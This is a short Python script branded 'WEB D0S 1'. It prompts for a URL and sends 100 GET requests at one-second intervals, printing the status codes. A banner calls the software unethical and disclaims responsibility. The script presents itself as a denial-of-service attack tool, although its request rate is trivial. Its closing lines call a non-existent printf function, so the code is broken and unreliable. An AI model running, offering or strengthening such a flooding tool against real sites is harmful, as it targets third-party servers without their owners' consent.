import requests
import time
import os
os.system('clear')
reset = "\033[0m"
siyah = "\033[30m"
kirmizi = "\033[31m"
yesil = "\033[32m"
sari = "\033[33m"
mavi = "\033[34m"
mor = "\033[35m"
cyan = "\033[36m"
beyaz = "\033[37m"
os.system('figlet WEB D0S 1')
asci="""
############################################
#                                          #
#    WE DO NOT ACCEPT RESPONSIBILITY;      #
#                                          #
#  This software is unethical,             #
#  please use it for testing purposes only.#
#  we are not responsible for any use.     #
#  --------------------------------------- # 
#                                          #
#  -$:MAKER : Yira   | TEAM : zTEAM        #
#                                          #
############################################
"""
print(kirmizi + asci + reset)
url = input(sari + "Link:" + reset) 
num_requests = 100
requests_interval = 1  

for _ in range(num_requests):
    response = requests.get(url)
    print(yesil + f"response status code: {response.status_code}" + reset)
    time.sleep(requests_interval)


printf("\e[0m\e[1;93m[\e[0m\e[1;91m0\e[0m\e[1;93m]\e[0m\e[1;96m Exit. \e[0m\n")
printf("\e[0m\e[1;93m[\e[0m\e[1;91m1\e[0m\e[1;93m]\e[0m\e[1;96m  To Return SiteW. \e[0m\n")
sec=input(":")
